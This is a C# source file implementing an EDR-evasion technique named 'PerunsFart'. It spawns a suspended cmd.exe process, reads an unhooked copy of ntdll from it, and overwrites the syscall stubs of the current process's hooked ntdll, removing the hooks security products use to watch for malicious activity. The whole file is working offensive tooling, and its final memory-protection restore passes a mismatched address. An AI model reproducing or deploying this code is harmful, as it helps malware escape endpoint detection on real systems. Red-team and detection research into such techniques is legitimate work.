using System;
using System.Collections;
using System.Diagnostics;
using System.Runtime.InteropServices;

using static PerunsFart.Native;

namespace PerunsFart
{
    class Program
    {
        static void Main(string[] args)
        {
            byte[] cache = null;

            Debug("Creating a new process to read in a clean copy of NTDLL");

            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            SECURITY_ATTRIBUTES pAttr = new SECURITY_ATTRIBUTES();
            SECURITY_ATTRIBUTES tAttr = new SECURITY_ATTRIBUTES();

            bool success = CreateProcess(null, "cmd.exe", ref pAttr, ref tAttr, false, CreateProcessFlags.CREATE_NEW_CONSOLE | CreateProcessFlags.CREATE_SUSPENDED, IntPtr.Zero, "C:\\Windows\\System32\\", ref si, out pi);

            if(success)
            {
                Debug("[+] New process created. Pid: {0}", new string[] { pi.dwProcessId.ToString() });

                // get the module size of NTDLL in memory
                uint modSize = GetModuleSize("ntdll");

                if (modSize == 0)
                {
                    // fail! Do nothing else!
                    Debug("[!] Getting NTDLL Module Size failed!");
                }
                else
                {
                    Debug("[+] ntdll Module Size: {0} bytes", new string[] { modSize.ToString() });

                    // allocate memory to store a clean copy of NTDLL
                    cache = new byte[modSize];

                    // read the clean module into the cache
                    success = ReadProcessMemory(pi.hProcess, GetModuleBaseAddress("ntdll"), cache, (int)modSize, out IntPtr lpNumberOfBytesRead);

                    if(success)
                    {
                        Debug("[+] Bytes read from remote process memory: {0} bytes", new string[] { ((int)lpNumberOfBytesRead).ToString() });
                    }
                    else
                    {
                        Debug("[!] Unable to read process memory!");
                    }
                }

                // kill the spawned process
                Debug("[+] Killing process. Pid: {0}", new string[] { pi.dwProcessId.ToString() });
                Process.GetProcessById(pi.dwProcessId).Kill();

                Debug("[+] Done");
            }
            else
            {
                Debug("[!] Unable to create a new process!");
            }

            // we can now unhook ntdll
            if(cache != null)
            {
                Debug("\nUnhooking NTDLL");
                UnhookDLL(cache, GetModuleBaseAddress("ntdll"));
                Debug("[+] Done");
            }

            Console.WriteLine("Press a key to end...");
            Console.ReadLine();
        }

        static bool UnhookDLL(byte[] cleanModule, IntPtr dirtyModuleBaseAddress)
        {
            // find the .text section of the cache
            unsafe
            {
                fixed (byte* p = cleanModule)
                {
                    IntPtr ptr = (IntPtr)p;
                    // Marshall the byte array an IMAGE_DOS_HEADER struct
                    IMAGE_DOS_HEADER dosHdr = (IMAGE_DOS_HEADER)Marshal.PtrToStructure(ptr, typeof(IMAGE_DOS_HEADER));

                    // get the address of the IMAGE_NT_HEADERS
                    IntPtr pNtHeaders = ptr + dosHdr.e_lfanew;

                    // Marshall a pointer into an IMAGE_NT_HEADERS64 struct
                    IMAGE_NT_HEADERS64 ntHdrs = (IMAGE_NT_HEADERS64)Marshal.PtrToStructure(pNtHeaders, typeof(IMAGE_NT_HEADERS64));

                    Debug("[+] Sections to enumerate is {0}", new string[] { ntHdrs.FileHeader.NumberOfSections.ToString() });

                    Int32 sizeOfNtHeader = (Marshal.SizeOf(ntHdrs.GetType()));

                    IntPtr pCurrentSection = pNtHeaders + sizeOfNtHeader;
                    IMAGE_SECTION_HEADER secHdr = (IMAGE_SECTION_HEADER)Marshal.PtrToStructure(pCurrentSection, typeof(IMAGE_SECTION_HEADER));

                    Debug("[+] First section is {0}", new string[] { secHdr.Section });
                    Debug("[+] First section is at 0x{0}", new string[] { pCurrentSection.ToString("X") });

                    // find the .text section of the newly loaded DLL
                    for (int i = 0; i < ntHdrs.FileHeader.NumberOfSections; i++)
                    {
                        Debug("[+] Analysing section {0}", new string[] { secHdr.Section });

                        // find the code section
                        if (secHdr.Section.StartsWith(".text"))
                        {
                            // when we find the .text section break out of the loop
                            Debug("[+] .text section is at 0x{0}", new string[] { pCurrentSection.ToString("X") });
                            break;
                        }

                        // find the start of the next section
                        Debug("[+] Section size is 0x{0}", new string[] { secHdr.SizeOfRawData.ToString("X") });
                        Int32 sizeOfSection = (Marshal.SizeOf(secHdr.GetType()));

                        pCurrentSection += sizeOfSection;
                        Debug("[+] Next section is at 0x{0}", new string[] { pCurrentSection.ToString("X") });
                        secHdr = (IMAGE_SECTION_HEADER)Marshal.PtrToStructure(pCurrentSection, typeof(IMAGE_SECTION_HEADER));
                    }

                    // here we locate the frist and last syscall in the module - these are the hooked bytes we want to overwrite with our clean module
                    // find the first syscall offset
                    int startOffset = FindFirstSyscallOffset(cleanModule, (Int32)secHdr.VirtualSize, dirtyModuleBaseAddress);

                    // find the last syscall offset
                    int endOffset = FindLastSyscallOffset(cleanModule, (Int32)secHdr.VirtualSize, dirtyModuleBaseAddress);

                    // get the syscall bytes from the clean module
                    byte[] cleanSyscalls = new byte[endOffset - startOffset];
                    Buffer.BlockCopy(cleanModule, startOffset, cleanSyscalls, 0, endOffset - startOffset);

                    // change the original dll page to writable
                    Debug("[+] VirtualProtect Dll to PAGE_EXECUTE_READWRITE...");
                    bool result = VirtualProtect(IntPtr.Add(dirtyModuleBaseAddress, startOffset), (UIntPtr)cleanSyscalls.Length, (UInt32)AllocationProtectEnum.PAGE_EXECUTE_READWRITE, out UInt32 lpflOldProtect);

                    // copy over the hooked ntdll
                    Debug("[+] Unhooking Dll by copying clean data...");
                    try
                    {
                        Marshal.Copy(cleanSyscalls, 0, IntPtr.Add(dirtyModuleBaseAddress, startOffset), cleanSyscalls.Length);
                    }
                    catch (Exception ex)
                    {
                        Debug("[!] Unable to copy mapped data! {0}", new string[] { ex.Message });
                        return false;
                    }

                    // reset memory protection
                    Debug("[+] VirtualProtect Dll to OldProtect");
                    result = VirtualProtect(IntPtr.Add(dirtyModuleBaseAddress, (Int32)secHdr.VirtualSize), (UIntPtr)secHdr.VirtualSize, lpflOldProtect, out  lpflOldProtect);
                }
            }

            return true;
        }
        
        static int FindFirstSyscallOffset(byte[] pMem, int size, IntPtr moduleAddress)
        {
            int offset = 0;
            byte[] pattern1 = new byte[] { 0x0f, 0x05, 0xc3 };
            byte[] pattern2 = new byte[] { 0xcc, 0xcc, 0xcc };

            // find first occurance of syscall+ret instructions
            for(int i=0; i < size - 3; i++)
            {
                byte[] instructions = new byte[3] { pMem[i], pMem[i + 1], pMem[i + 2] };

                if (StructuralComparisons.StructuralEqualityComparer.Equals(instructions, pattern1))
                {
                    offset = i;
                    break;
                }
            }

            // find the beginning of the syscall
            for(int i = 3; i < 50; i++)
            {
                byte[] instructions = new byte[3] { pMem[offset - i], pMem[offset - i + 1], pMem[offset - i + 2] };

                if (StructuralComparisons.StructuralEqualityComparer.Equals(instructions, pattern2))
                { 
                    offset = offset - i + 3;
                    break;
                }
            }

            IntPtr addr = IntPtr.Add(moduleAddress, offset);

            Debug("[+] First syscall found at offset: 0x{0}, addr: 0x{1}", new string[] { offset.ToString("X"), addr.ToString("X") });

            return offset;
        }

        static int FindLastSyscallOffset(byte[] pMem, int size, IntPtr moduleAddress)
        {
            int offset = 0;
            byte[] pattern = new byte[] { 0x0f, 0x05, 0xc3, 0xcd, 0x2e, 0xc3, 0xcc, 0xcc, 0xcc };

            for(int i = size - 9; i > 0; i--)
            {
                byte[] instructions = new byte[9] { pMem[i], pMem[i + 1], pMem[i + 2], pMem[i + 3], pMem[i + 4], pMem[i + 5], pMem[i + 6], pMem[i + 7], pMem[i + 8] };

                if (StructuralComparisons.StructuralEqualityComparer.Equals(instructions, pattern))
                {
                    offset = i + 6;
                    break;
                }
            }

            IntPtr addr = IntPtr.Add(moduleAddress, offset);

            Debug("[+] Last syscall found at offset: 0x{0}, addr: 0x{1}", new string[] { offset.ToString("X"), addr.ToString("X") }) ;

            return offset;
        }

        static uint GetModuleSize(string module)
        {
            Debug("[+] Getting Module Size: {0}", new string[] { module });

            // get the size of the ntdll in memory
            IntPtr addrMod = GetModuleBaseAddress(module);

            if (addrMod != IntPtr.Zero)
            {
                Debug("[+] Got Module base address: 0x{0}", new string[] { addrMod.ToString("X") });
            }
            else
            {
                Debug("[!] Unable to get Module base address!");
                return 0;
            }


            // Marshall the pointer into an IMAGE_DOS_HEADER struct
            IMAGE_DOS_HEADER dosHdr = (IMAGE_DOS_HEADER)Marshal.PtrToStructure(addrMod, typeof(IMAGE_DOS_HEADER));

            if (dosHdr.isValid)
            {
                Debug("[+] Module is a valid image.");
            }
            else
            {
                Debug("[!] Module is NOT a valid image!");
                return 0;
            }

            // get the address of the IMAGE_NT_HEADERS
            IntPtr pNtHeaders = addrMod + dosHdr.e_lfanew;

            // Marshall a pointer into an IMAGE_NT_HEADERS64 struct
            IMAGE_NT_HEADERS64 ntHdrs = (IMAGE_NT_HEADERS64)Marshal.PtrToStructure(pNtHeaders, typeof(IMAGE_NT_HEADERS64));

            Debug("[+] e_lfanew equals 0x{0}", new string[] { dosHdr.e_lfanew.ToString("X") });
            Debug("[+] NT_HEADERS address is 0x{0}", new string[] { pNtHeaders.ToString("X") });

            if (ntHdrs.isValid)
            {
                Debug("[+] Module NT Headers is valid.");
            }
            else
            {
                Debug("[!] Module NT Headers is NOT valid!");
                return 0;
            }

            // get the size of the NTDLL module in memory
            uint modSize = ntHdrs.OptionalHeader.SizeOfImage;

            return modSize;
        }

        static IntPtr GetModuleBaseAddress(string name)
        {
            // grab the current process
            Process hProc = Process.GetCurrentProcess();

            // find the module we are looking for
            foreach (ProcessModule m in hProc.Modules)
            {
                // return the base address
                if (m.ModuleName.ToUpper().StartsWith(name.ToUpper()))
                    return m.BaseAddress;
            }

            // we can't find the base address
            return IntPtr.Zero;
        }

        public static void Debug(string text, string[] args)
        {
#if DEBUG
            Console.WriteLine(text, args);
#endif
        }

        public static void Debug(string text)
        {
#if DEBUG
            Console.WriteLine(text, new string[] { });
#endif
        }
    }
}
